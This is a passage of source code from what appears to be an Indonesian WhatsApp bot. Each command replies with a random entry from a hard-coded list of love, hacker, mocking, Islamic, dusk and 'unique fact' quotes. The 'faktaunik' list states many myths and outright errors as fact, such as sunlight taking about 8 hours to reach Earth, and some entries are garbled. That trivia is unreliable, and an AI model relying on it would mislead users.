"Tidak peduli berapa banyak perkelahian yang mungkin kamu alami, jika kamu benar-benar mencintai seseorang, itu tidak akan menjadi masalah pada akhirnya."
]
const katacinta = cinta[Math.floor(Math.random() * cinta.length)]
m.reply(`${katacinta}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'katahacker': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const hacker = [
"Apa yang dilakukan peretas adalah mencari tahu teknologi dan bereksperimen dengannya dengan cara yang tidak pernah dibayangkan banyak orang. Mereka juga memiliki keinginan yang kuat untuk membagikan informasi ini dengan orang lain dan menjelaskannya kepada orang-orang yang satu-satunya kualifikasi mungkin adalah keinginan untuk belajar.",
"Peretas adalah bakat. Anda tidak akan mempelajarinya di sekolah. Ini seperti menjadi Messi atau C. Ronaldo. Jika Anda dilahirkan untuk menjadi seorang peretas, itu adalah takdir Anda. Jika tidak, Anda akan diretas.",
"Kebodohan manusia, itulah sebabnya peretas selalu menang.",
"Ingat, ketika Anda terhubung dengan komputer lain, Anda terhubung ke setiap komputer yang terhubung dengan komputer.",
"Peretasan komputer seperti ikatan kimia yang mengikat kita semua.",
"Jika Anda adalah peretas yang baik, semua orang mengenal Anda. Tetapi, jika Anda peretas yang hebat tidak ada yang mengenal Anda.",
"Sains adalah apa yang kami pahami dengan cukup baik untuk dijelaskan ke komputer; seni adalah segalanya.",
"Anda tidak dapat meretas takdir, kekuatan kasar... Anda perlu pintu belakang, saluran samping ke dalam hidup.",
"Lawan dulu dan sekarang memiliki kelemahan esensial yang sama tentang mereka. Pertama mereka ingin menggunakan Anda, kemudian ingin menjadi Anda, kemudian mereka ingin menghabisi Anda.",
"Bagi saya, komputer itu alat yang paling luar biasa yang pernah kita miliki. Ini setara dengan sepeda untuk pikiran kita.",
"Tidak ada yang tidak baik atau buruk tentang pengetahuan itu sendiri; moralitas terletak pada penerapan pengetahuan.",
"Saya percaya pada dunia di mana semua hal ini bisa terjadi, bahkan jika saya harus melakukannya sendiri.",
"Pelajari hari Ini, terapkan hari Ini.",
"Hal terpenting tentang teknologi adalah bagaimana hal itu mengubah orang.",
"Percayalah pada getaran yang Anda dapatkan, energi tidak berbohong.",
"Anda hanya berjarak satu klik untuk menemukan diri sejati anda.",
"Ketika kita semua memiliki akses ke informasi, kita kuat. Ketika kita kuat, kita tetap memiliki kekuatan untuk melakukan hal yang mustahil.",
"Saat berjudi, seseorang harus tahu lawan mereka, dan kelemahan mereka. Terutama, jika lawan itu adalah mesin.",
"Kami melakukan hal-hal yang kami lakukan untuk rakyat, bukan untuk kepentingan kita sendiri seperti sebuah ketenaran.",
"Virality is not an accident. It is engineered. And that's why growth hackers beat traditional marketers.",
"Jika Anda yakin bahwa satu ide dapat mengubah dunia, maka kami percaya Anda adalah gagasan itu.",
"Pemerintah dunia tidak bisa terus menerus menekan Anonymous untuk selamanya, karena jumlah mereka terus berkembang setiap hari.",
"Duniaku jauh lebih menarik dari dunia mereka.",
"Ini tak semudah yang orang lain lihat, dan ini bukan hal yang dapat dilakukan semua orang.",
"Tak ada yang tahu identitas kami.",
"Kami tumbuh untuk percaya bahwa kami tidak bersalah sampai terbukti bersalah, tapi kenyataannya kami selalu divonis bersalah.",
"Di balik layar monitor ini aku dapat melihat dunia.",
"Kami dimulai sebagai sekelompok orang yang dikendalikan tanpa sebuah alasan.",
"Bukan tanpa alasan hal ini kami lakukan, ini semua untuk kebebasan yang dikekang pemerintah.",
"Kita tidak perlu pemimpin. Kita punya ide. Ide adalah anti peluru.",
"Faktanya ya, mereka sangat mudah. Masalahnya adalah anda tidak harus melindungi diri dari orang bodoh. Anda harus melindungi diri terhadap orang seperti saya.",
"Ketika penjahat kaya membutuhkan orang miskin, orang miskin mungkin membuat harga yang mereka mau.",
"Lawan dulu dan sekarang memiliki kelemahan esensial yang sama tentang mereka. Pertama mereka ingin menggunakan anda, kemudian ingin menjadi anda, kemudian mereka ingin menghabisi anda.",
"Bukan monster yang harus kita takuti; itu adalah orang-orang yang tidak mengenali monster yang sama di dalam diri mereka.",
"Jika anda adalah peretas yang baik, semua orang mengenal anda. Tetapi, jika anda peretas yang hebat tidak ada yang mengenal anda.",
"Mereka menganggapku remeh dalam dunia nyata, tapi mereka tidak tahu aku di dalam 'Cyber World'.",
"Kami dimulai sebagai sekelompok orang yang dikendalikan tanpa sebuah alasan.",
"Menjadi seorang kriminal bukanlah hal yang memalukan. Sedangkan untuk tetap menjadi penjahat adalah aib.",
"Bukan tanpa alasan hal ini kami lakukan, ini semua untuk kebebasan yang dikekang pemerintah.",
"Kami tumbuh untuk percaya bahwa kami tidak bersalah sampai terbukti bersalah, tapi kenyataannya kami selalu divonis bersalah.",
"Kebanyakan peretas masih muda, karena orang cenderung mudah beradaptasi. Selama anda tetap bisa beradaptasi, anda selalu bisa menjadi peretas yang baik.",
"Jika anda yakin bahwa satu ide dapat mengubah dunia, maka kami percaya anda adalah gagasan itu.",
"Kemajuan teknologi seperti kapak di tangan seorang penjahat patologis.",
"I'm a hacker, but I'm the good kind of hackers. And I've never been a criminal.",
"If you wanna know how not secure you are, just take a look around. Nothing's secure. Nothing's safe. I don't hate technology, I don't hate hackers, because that's just what comes with it, without those hackers we wouldn't solve the problems we need to solve, especially security.",
"Social engineering has become about 75% of an average hacker's toolkit, and for the most successful hackers, it reaches 90% or more.",
"Hackers are breaking the systems for profit. Before, it was about intellectual curiosity and pursuit of knowledge and thrill, and now hacking is big business.",
"Very smart people are often tricked by hackers, by phishing. I don't exclude myself from that. It's about being smarter than a hacker. Not about being smart.",
"Hackers rarely have full knowledge of the technology stack of a target.",
"Hackers are seen as shadowy figures with superhuman powers that threaten civilization.",
"What fashion has started from hackers? They have bad posture, and they don't go out. I wish I had a hacker boyfriend - they stay at home up in the bedroom.",
"Garbage can provide important details for hackers: names, telephone numbers, a company's internal jargon.",
"When hackers have access to powerful computers that use brute force hacking, they can crack almost any password; even one user with insecure access being successfully hacked can result in a major breach.",
"In the aftermath of the oh-so-predictable crash, the Bitcoin fanatics have begun marshaling out excuse after excuse for why this non-investment investment lost so much of its value so fast. One was that hackers attacked some of the exchanges for Bitcoins and crippled it. Really? A hacker can wreck an entire market?",
"Hackers often describe what they do as playfully creative problem solving. Heather Brooke Problem Creative Often Computer hackers do not need to know each other's real names, or even live on the same continent, to steal millions in mere hours.",
"We face cyber threats from state-sponsored hackers, hackers for hire, global cyber syndicates, and terrorists. They seek our state secrets, our trade secrets, our technology, and our ideas - things of incredible value to all of us. They seek to strike our critical infrastructure and to harm our economy.",
"Hackers are becoming more sophisticated in conjuring up new ways to hijack your system by exploiting technical vulnerabilities or human nature. Don't become the next victim of unscrupulous cyberspace intruders.",
"I don't hate technology, I don't hate hackers, because that's just what comes with it, without those hackers we wouldn't solve the problems we need to solve, especially security.",
"I really didn't understand why hackers would want to hack into a classroom. Are they going to learn algebra? Maybe calculus?"
]
const katahacker = hacker[Math.floor(Math.random() * hacker.length)]
m.reply(`${katahacker}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'katasindiran': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const sindiran = [
"Makanya copy yang bener",
"Punya otak kan? Otak nya di pake jangan di pajang doang",
"Keren, kapan ya bisa up youtube?",
"Jangan di suapin terus, Kapan mandiri nya",
"Butuh ngerenges kek anak kecil, giliran dibutuhin ngilang",
"njir cepu, kapan ya bisa gitu?",
"Gak ada referensi ya? Pantes maling terus",
"keren, kapan ya bisa jago",
"Mastah memang beda, full fitur mathfloor",
"Udh tau cepu kenapa masih di kasih? Akal nya dimana?",
"Gak ada referensi ya? Pantes maling terus",
"Baca dulu, pahami terus copy",
"Jangan di suapin terus, Kapan mandiri nya",
"Keren, kapan ya jadi cepu?",
"Copy dulu tolol baru paste",
"Keren, kapan ya bisa sebar fitur?",
"Keren, kapan ya bisa up github?",
"Gua bukan dukun, Kalo ga di kasih tunjuk fiturnya ga bisa kasih solusi dodol",
"Demi konten, up youtube dulu kita boy",
"Butuh ngerenges kek anak kecil, giliran dibutuhin ngilang",
"Pahami -> resapi -> minta case",
"Percuma fitur banyak tapi pada mati",
"Jika pelit lanjutkan",
"Demi konten, up youtube dulu kita boy"
]
const katasindiran = sindiran[Math.floor(Math.random() * sindiran.length)]
m.reply(`${katasindiran}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'quotesislamic': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const islamic = [
"Karena yang hanya pamer foto mesra disosmed akan kalah dengan yang cantumin foto di buku nikah",
"Allah maha kuasa dan Allah maha tahu, jadi meskipun aku dan kamu tidak menjadi kita, insyaallah ini yang terbaik",
"Gak usah bingung seperti apa jodohmu kelak, Insyaallah dia tidak akan jauh daripada sifatmu saat ini",
"Semua pengorbanan dan perjuangan kel akan mendapatkan balasan yang terbaik",
"Aku berharap bisa hidup mendampingimu namun apa daya ternyata diriku tidaklah baik untuk mendampingi dirimu",
"Ya Allah maafkan segala kemaksiatan yang sudah hamba perbuat",
"Sahabat adalah orang yang ikhlas bersama kita dalam senang dan susah dan saling menasehati dalam ketaatan kepada Allah",
"Musibah yang membuatmu kembali kepada Allah lebih baik dari nikmat yang membuatmu lupa kepada Allah",
"Balaslah keburukan dengan kebaikan",
"Untuk yang baru berhijrah jadilah seperti pakaian baru yang senantiasa kita rawat dan jaga agar senantiasa presiden terjaga Jika ia kotor maka akan dibersihkan dari noda",
"Allah maha kuasa dan Allah maha tahu, jadi meskipun aku dan kamu tidak menjadi kita, insyaallah ini yang terbaik",
"Ucapkan alhamdulillah karena bisa jadi itu adalah cara Allah menyapa kita lewat rasa sakit yang kita terima",
"Alhamdulillah atas segala nikmat yang telah engkau berikan",
"Ketika nyawa sudah tiada kemudian Allah menambah-nambah satu hari lagi kesempatan itu hidup niscaya kita akan bertaubat",
"Tambahkan pasangan itu dia bisa membimbing bukan hanya di dunia tapi juga di akhirat",
"Semoga memang dirimulah yang kelak menjadi pendamping hidupku",
"Kunci hidup bahagia adalah Jalani, Nikmati dan Syukuri",
"Salah satu ciri lellaki setia adalah berani menikahi di dia, bukan memacarinya. Apalagi meninggalkannya di kala semua sudah diserahkan",
"Aku menunggumu untuk segera menghalalkanku tapi jika kelak yang datang lebih awal bukan dirimu tapi baik agamanya Mungkin dia yang terbaik untukku",
"Kalau lagi hujan kini biasanya sahabat berdoa minta apa",
"Jangan salahkan orang ketika kamu kecewa, tapi salahkan dirimu sendiri karena terlalu berharap sesuatu yang belum pasti",
"Jangan pernah merasa lebih baik daripada orang lain karena kita tidak tahu seberapa banyak amal kebaikan yang ia tutupi",
"Tak harus kamu yang sempurna, setidaknya kamu yang selalu berusaha istiqpmah di setiap waktu yang kamu punya. Karena kita akan berkerjasama membangun rumah di surga",
"Semoga dalam kesendirian ini bisa bisa betul-betul lolos dalam ujian menahan diri dari lawan jenis",
"Hubungan yang jelas di dalamnya ada pembohongan bagaimana kau akan membangun rumah tangga dengan pribadi seperti itu",
"Jodoh bukan siapa cepat pasti dapt tapu jika Allah telah tetapkan sudah pasti dapat",
"Ku rindu padamu ya rasul Kuingin jumpa Sekedar Saja walau hanya dalam mimpi",
"Apalah gunanya hidup 100 tahun kalau tidak shalat dan tidak mengaji",
"Lebih baik tersindir ketika diingatkan, daripada tidak merasakan apa-apa ketika diingatkan",
"Jangan mati-matian menghias diri untuk menjadi seperfect mungkin. Padahal yang kamu harus selalu jaga dan perbaiki adalah kualitas diri bukan kualitas fisik",
"Akan tiba saatnya sendiri ku menjadi kebahagiaan yang Hakiki",
"Hukuman terberat dari Allah ketika Allah telah menutup diri kita untuk dapat berbuat dan melakukan kebaikan-kebaikan",
"Takkan datang ridha Allah pada hubungan yang melanggar larangan Allah",
"Yang palilng aku takutkan atas umat ini adalah orang berilmu yang munafik",
"Semua itu butuh pengorbanan dan keikhlasan apalagi memilih jalan kebaikan pasti akan ada selalu orang yang bertentangan tetapi Allah takkan pernah menutup Kerinduan bagi mereka yang rela melakukan perubahan",
"Sungguh tak terhitung banyaknya nikmat yang sudah engkau berikan kepada kami ya Allah",
"Sebagian masa depanmu ditentukan oleh Siapa teman bergaulmu",
"Aku berharap bisa menjadi pemimpin yang baik yang memimpin mu dengan iman dan ketaqwaan",
"Dalam mengejar rejeki Janganlah mengajar jumlahnya tetapi kejarlah berkahnya",
"Mencintai dengan sungguh-sungguh memberikan kebahagiaan di hati kita mencintai karena Allah kita mendapat nilai ibadah dan kebahagiaan yang lebih",
"Maka aku ucapkan selamat engkau sukses membuat perasaannya sedikit terluka",
"Terkadang bukan karena kita tahu caranya memuntahkan amarah tapi kita tahu jika makin marah tak akan menyelesaikan masalah",
"Seorang muslimah sejati adalah bisa menanamkan cinta terdalam di hati suaminya bukan pacarnya",
"Ketika seseorang pergi dan tinggalkan kita maka datanglah pada Allah dengan doa dan ibadah kita bersungguh-sungguh kita akan merasakan keindahan dan kasih sayang yang luar biasa",
"Sedekah tidak sama dengan matematika bisa ditambah, dikurang, dibagi dan dikali. Karena sedekah itu akan berlimpah dan berkalilipa kembali kepada kita",
"Siapapun yang merindukan sukses, maka harus bertanya pada dirinya seberapa jauh dan sungguh-sungguh untuk berjuang, karena tiada kesuksesan tanpa perjuangan",
"Sejatinya bukan karena kita hebat tapi Allah yang memudahkan urusan kita",
"Semut akan berkerumun di sekitar gula jika ingin mencari jodoh Shalih Carilah di kumpulan orang Shalih",
"Bila hijrahmu karena Allah, kamu akan terus melangkah walaupun sudah lelah",
"Tak usah tergoda dengan wanita yang lihai memainkan tulisan bedak di mukanya sebab anakmu kelak butuhnya ibu yang berakhlak",
"Yakinlah masalah yang menimpamu saat ini merupakan cara Allah untuk mengingatkanmu agar lebih dekat dengan Allah",
"Kuharap semua doa disetiap sudut panjangku bisa melangit dan terkabulkan",
"Ada cinta yang menghantarkan menuju kemaksiatan, ada juga cinta yang membuat seseorang berubah mencintai hanya karena Allah, saling mencintailah karena Allah",
"Harus disadari oleh wanita muslimah bahwa yang telah menyaksikan Kecantikan adalah suaminya dan para mahromnya",
"Kalau lagi hujan kini biasanya sahabat berdoa minta apa"
]
const quotesislamic = islamic[Math.floor(Math.random() * islamic.length)]
m.reply(`${quotesislamic}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'faktaunik': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const fakta = [
"Orang yang membayangkan suara baru yang belum pernah didengar, atau menggabungkan sebuah melodi matanya akan bergerak ke kir",
"Jika kita terkunci diruang yang kedap udara, kita aka lebih dulu mati keracunan co2 dari pada kekerangan o2",
"Titik merah pada 7-Up logo berasal dari penemunya yang bermata merah. Dia seorang albino.",
"Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.",
"Orang sherpa di Nepal menganjurkan orang memakan bawang putih utk mencegah dan mengobati rasa tidak nyaman yg disebabkan ketinggian gunung.",
"Tanda ’save’ pada Microsoft Office programs menunjukan gambar floppy disk dengan shutter terbalik",
"Ayam yang sudah terpenggal lehernya masih mampu lari sepanjang lapangan bola sebelum benar-benar mati",
"Biji apel merupakan racun ringan namun tidak berbahaya bagi manusia",
"Gajah hanya tidur 2 jam dalam sehari",
"Jika lever manusia berhenti bekerja, manusia akan mati dalam 8 samapai 24 jam",
"Kecuali manusia dan monyet, semua mamalia buta warna",
"Orang yang terlalu sering begadang memiliki performa otak seperti 7 tahun lebih tua dari usia aslinya. [dailymail]",
"Ikan mas yang bunting disebut ‘twit’.",
"Pada Usia 3 bulan janin manusia mulai terbentuk sidik jari.",
"Nama paling populer di dunia adalah Muhammad.",
"Seekor cheetah dapat berlari 76 km per jam.",
"Kita bisa mematangkan Mangga dengan cepat dengan cara memasukkan ke dalam paperbag bersama dengan pisang matang.",
"Kulit Zebra adalah putih yang bergaris hitam",
"Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut “Barbe á Papa” yang berarti “Jenggot Ayah”.",
"Darah sama kental dengan air laut",
"Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan kecemasan, bahkn dpt meningkatkan memori. [Dailymail]",
"Tikus dan kuda tidak bisa muntah",
"Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.",
"Kita bisa mematangkan Mangga dengan cepat dengan cara memasukkan ke dalam paperbag bersama dengan pisang matang.",
"25% kandungan dalam apel adalah Udara. makanya apel bisa mengapung",
"RSVP adalah Respondez s’il Vous Plait yang artinya ‘mohon jawaban’",
"Ada lebih dari 300 bakteri pembentuk karang gigi",
"Kalajengking bisa dibunuh dengan menyiramnya dengan cuka,mereka akan murka dan menyengat dirinya sendir",
"Jantung ikan paus biru berdenyut 9 kali dalam semenit",
"Jika lever manusia berhenti bekerja, manusia akan mati dalam 8 samapai 24 jam",
"IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.",
"Di Bumi, satu tahun adalah 365 hari. Di planet Merkurius satu tahun adalah 2 hari",
"Sapi tidak punya gigi atas",
"Berdiri lama tanpa menekuk lutuk sama sekali akan membuat kita pingsan",
"Kebiasaan sibuk memotret dan mengunggah foto makanan di sosial media, beresiko seseorang menjadi gendut. [Dr. Valerie Taylor]",
"Darah sama kental dengan air laut",
"Orang yang menggunakan tangan kanan, kira-kira, 9 tahun lebih panjang umur dari orang kidal",
"Riset membuktikan, memakan pisang bisa menambah daya ingat",
"Mangunyah permen karet saat mengupas bawang mencegah kita menangis",
"Kiwi ditetapkan sebagai buah kebangsaan di Cina",
"Kuku ibu jari tumbuh lambat dan kuku jari tengah yang tercepat.",
"Mahluk yang bisa tersipu-sipu hanya manusia",
"Hormon Cinta hanya bertahan 4 tahun, sisanya dorongan seks. [penelitian di University of Mexico]",
"Mengoleskan jeruk nipis dapat mencerahkan bagian lutut / siku yang hitam.",
"Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]",
"Kutu rambut sebenarnya lebih suka hidup di kulit kepala yang bersih dari pada yang kotorUmur dari capung adalah 24 jam",
"Terdapat hampir 50 jenis kangguru.",
"Tangan kanan orang hidup lebih lama dari tangan kiri.",
"Pulau Giliyang di Sumenep, Jawa Timur disebut sbg pulau “Awet Muda” karena pulau ini memiliki kandungan oksigen terbaik di dunia. [tempo co]",
"Unta punya 3 kelopak mata.",
"Tiga monyet bijak punya nama: Mizaru (See no evil), Mikazaru (Hear no evil), and Mazaru (Speak no evil).",
"Gajah satu-satunya hewan yang tidak bisa meloncat",
"Kuda Nil kentut lewat mulut.",
"Pemogokan cahaya di bumi sekitar 6.000 kali per menit.",
"Di zaman penjajahan Belanda, hukuman orang yg berzina adlh ditangkap dan dicorengkan arang pd hidungnya. Inilah asal usul “Hidung Belang”.",
"IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.",
"Perut memproduksi lapisan lendir setiap dua minggu agar perut tidak mencerna organnya sendiri.",
"Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.",
"makan plum membantu meningkatkan penyerapan zat besi dalam tubuh",
"Ilmu tentang perkembangan apel disebut Pomology",
"Coklat meleled dalam mulut karena titik lelehnya adalah 35 derajat celcius",
"Venus dan Uranus adalah planet di tata surya kita yang berputar melawan jarum jam. Jadi matahari terbit dari barat di planet ini.",
"13% orang di dunia adalah kidal",
"Jaguar takut pada anjing",
"Pita karet terpanjang adalah di kulkas.",
"Tanduk badak terbuat dari rambutnya yang mengeras",
"Ada sekitar 10ribu jenis apel di dunia Kutu rambut sebenarnya lebih suka hidup di kulit kepala yang bersih dari pada yang kotor",
"salah satu spesies markisa yang buahnya berwarna ungu bisa melakukan fertilisasi sendiri",
"Kentut sapi termasuk penyebab utama global warming",
"Tikus dan kuda tidak bisa muntah",
"Sekitar 180 juta kartu Valentine tersebar per tahunnya.",
"Telur segar tenggelam diair, telur yang kadaluarsa mengambang",
"Mangunyah permen karet saat mengupas bawang mencegah kita menangis",
"Jika semua emas dalam laut ditambang, setiap manusia didunia bisa mendapat emas 20 kg masing2.",
"Pria kehilangan 40 helai rambut tiap hari. wanita 70 helai.",
"Mangunyah permen karet saat mengupas bawang mencegah kita menangis",
"Saat kita bertahan hidup dan tidak ada bahan makanan, sabuk kulit dan sepatu keds adalah makanan terbaik untuk dimakan karena mengandung cukup gizi untuk hidup sementara.",
"Titik diatas huruf i disebut ‘title’",
"Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai “emas putih”.",
"A “jiffy” is the scientific name for 1/100th of a second.",
"Amerika telah memiliki 30,30% bandara di dunia & India hanya 0,70%.",
"Umur dari capung adalah 24 jam",
"Gigi berang-berang tak pernah berhenti tumbuh",
"Lidah seekor Chameleon adalah dua kali panjang tubuhnya sendiri.",
"Eropa adalah benua tanpa padang pasir",
"69% orang Amerika menggunakan internet dan hanya 5,5% dari India.",
"Secara fisik, babi tidak bisa melihat ke langit",
"Pemantik ditemukan sebelum korek api",
"Dry Ice tidak meleleh, tapi menguap",
"Nama Artic (kutub utara) berarti beruang dalam bahasa Yunani (Arktos), dan memang beruang kutub hanya ada di kutub utara",
"Seseorang masih akan sadar selama 8 detik setelah dipenggal",
"Albert Einstein dan Charles Darwin,keduanya menikah dengan sepupu pertama mereka (Elsa Löwenthal dan Emma Wedgewood).",
"98% dari perkosaan dan pembunuhan dilakukan oleh keluarga dekat atau teman korban.",
"Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)",
"Rat-rata orang bergerak 40 kali dalam tidurnya",
"Bunga pohon markisa adalah Bunga kebangsaan negara Paraguay",
"Topeng tokoh Michael Myers di film horor ‘Helloween’ sebenernya topeng tokoh Captain Kirk (Star Trek) yang di cat putih, karena kurang dana",
"Kucing berkeringat melalui telapak kakinya (terutama saat mendengar gonggongan anjing)",
"Tehnik mengaduk terbaik bukan dengan gerakan memutar, tapi dengan gerakan huruf W",
"Nomer “172? dapat ditemukan pada uang kertas 5 dollar amerika, pada gambar semak-semak dibawah Lincoln Memorial.",
"Shuttlecock untuk badminton harus punya 14 bulu.",
"Memakan seledri membuang kalori lebih banyak dari pada kalori yang terkandung dalam seledri itu sendiri",
"Kulit Plum dipercaya memiliki efek Laxative",
"Burung umumnya tidak berkicau apabila mereka hinggap di tanah (Hummingbirdworld).",
"Pendeta Mesir kuno mencabuti setiap helai rambut dan bulu dari badan mereka.",
"Nama asli butterfly (kupu-kupu) adalah flutterby.",
"Dalam setiap inci persegi permukaan smartphone terdapat skitar 25.107 kuman, artinya smartphone lebih kotor dr kloset. [Laporan dr Proporta]",
"Radiasi dari 1 batang rokok sama dgn radiasi 2000x X-ray",
"Tanduk badak terbuat dari rambutnya yang mengeras",
"Kelelawar selalu belok kiri jika terbang keluar gua",
"Ubur-ubur terdiri dari 95% air",
"riset membuktikan bahwa makan apel bisa mengurangi risiko kena kanker",
"Julius Caesar tewas dengan 23 tikaman",
"Orang yang berusia di atas 100 di AS meningkat dari 4.000 pada tahun 1960 menjadi 55.000 pada tahun 1995.",
"Tidak ada bukti yang pasti siapa yang membangun Taj Mahal.",
"Cahaya matahari mencapai bumi membutuhkan waktu sekitar 8 jam 3 detik.",
"IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.",
"Telur segar tenggelam diair, telur yang kadaluarsa mengambang",
"Ken Edwards seorang pria asal Inggris memegang rekor Guinness untuk makan 36 kecoa dalam 1 menit.",
"mangga masih 1 family dengan tanaman Poison Ivy",
"Pisang mengandung vitamin B6 yang bisa mengontrol kadar gula dalam darah, dan membangkitkan mood",
"Microwave ditemukan setelah seorang ilmuan yang berjalan melewati tabung radar mendapati permen coklatnya meleleh disakunya.",
"Hangry adalah penggabungan kata dari “Hungry” dan “Angry”, di pakai ketika anda sedang lapar dan marah.",
"Nama asli butterfly (kupu-kupu) adalah flutterby.",
"Sekitar 14% pecandu yang menggunakan jarum suntik, positif HIV.",
"Karena langkanya logam, piala Oscars yang dibagikan pada perang dunia ke II terbuat dari kayu",
"Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan.",
"Merebus telur burung unta butuh waktu 40 menit.",
"Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]",
"nanas yang belum matang adalah racun",
"Kucing rumah benci bau lemon dan semua yang berbau sitrus",
"Nama “Gorila” berasal dari kata Yunani “Gorillai” yang berarti “perempuan berbulu”.",
"Hanya 3 malaikat, Gabriel, Michael dan Lucifer yang disebut dalam injil.",
"Air laut di samudra Atlantik lebih asin dari pada di samudra Pasifik",
"bagian dalam kulit pisang juga bisa digunakan untuk menghilangkan gatal bekas gigitan nyamuk dengan cara menggosokkannya",
"Mangunyah permen karet saat mengupas bawang mencegah kita menangis",
"Kode Telephone Internasional untuk Antartica adalah 672.",
"Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]",
"25% kandungan dalam apel adalah Udara. makanya apel bisa mengapung",
"Buku Guinness Book of Records memegang rekor sebagai buku yang paling banyak dicuri dari perpustakaan",
"Kulit Zebra adalah putih yang bergaris hitam",
"Unta punya 3 kelopak mata.",
"David Sarnoff adalah orang yang menerima sinyal Titanic dan meyelamatkan ratusan nyawa. Dia akhirnya menjadi kepala jaringan radio, the National Broadcasting Company (NBC).",
"pohon kelapa entah kenapa disebut “Tree of Life”",
"Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)",
"Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]",
"Kalajengking bisa dibunuh dengan menyiramnya dengan cuka,mereka akan murka dan menyengat dirinya sendir",
"Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]",
"Orang yang cerdas memiliki kadar seng dan tembaga di rambut mereka"
]
const faktaunik = fakta[Math.floor(Math.random() * fakta.length)]
m.reply(`*Taukah Kamu?*\n\n${faktaunik}`)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'katasenja': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
const senja = [
"Bukan senja namanya jika tak sendu, bukan senja namanya jika tak sunyi, dan bukan senja namanya jika tak mencipta rindu.",
"Kita hanyalah setitik senja yang kadang indah lalu surut dengan bermuram durja, dunia bagi masa kecil kita hanyalah mainan fana yang terus membumbung, mengitari angkasa dan membuat kita terlena akan keindahannya…",
"Cobalah jadi malam agar kau tahu rasanya rindu, dan jadilah senja sesekali agar kau tahu artinya menanti.",
"Aku melintasi kehidupan dan kala. Aku berlayar menembus senja. Kuberanikan diri menulis untuk mengabadikan momen hidup dalam lembaran kertas.",
"Semerbak rindu kuasai udara panas ini, senja pun ikut berdebar menanti berita mu tentang perang dan cinta.",
"Hampa itu seperti langkah tak berjejak, senja tapi tak jingga, cinta tapi tak dianggap",
"Aku ingin kamu saja yang menemaniku membuka pagi hingga melepas senja, menenangkan malam dan membagi cerita.",
"Senja akan selalu seperti itu. Datang dengan keindahannya, dan lalu akan pergi begitu saja dengan sangat cepat, tergantikan dengan kehampaan malam yang sunyi.",
"Di dalam dekapan sang senja, diriku mengharapkan sebuah asa, yang dapat membuat semesta yang fana menjadi semesta yang penuh warna.",
"Aku melintasi kehidupan dan kala. Aku berlayar menembus senja. Kuberanikan diri menulis untuk mengabadikan momen hidup dalam lembaran kertas.",
"Usia senja bukanlah hal yang membuat sedih. Itu bisa jadi hal yang disyukuri jika kita menyelesaikan semua perkejaan kita",
"Karena senja tak pernah memintamu menunggu.",
"Jika kamu merindukan seseorang, tataplah matahari sore. Kirimkan pesan rindumu untuknya lewat senja.",
"Aku melintasi kehidupan dan kala. Aku berlayar menembus senja. Kuberanikan diri menulis untuk mengabadikan momen hidup dalam lembaran kertas.",
"Karena senja tak pernah memintamu menunggu.",
"Senja selalu menggiring keceriaan menuju kegelapan. Mungkin hanya mereka yang bersyukur yang mampu menyeka air mata untuk melihat bintang.",
"Senja tak pernah salah hanya kenangan yang membuatnya basah.",
"Aku hanyalah kunang-kunang dan engkau hanyalah senja. Saat gelap kita berbagi. Saat gelap kita abadi.",
"Bukan senja namanya jika tak sendu, bukan senja namanya jika tak sunyi, dan bukan senja namanya jika tak mencipta rindu.",
"Mungkin kelak akan ada senja yang sepi untukmu, satu persatu kenangan mulai kau ingat, dan tersenyum ketika giliranku lewat.",
"Jika pena berganti rupa menjadi daun senja, biarlah dia mengering, lalu tersapu angin, sendiri dan dibiarkan oleh sepi.",
"Karena senja tak pernah memintamu menunggu.",
"Senja mengajarkan pada kita, bahwa kehidupan tak selalu berjalan dengan cemerlang dan bersinar.",
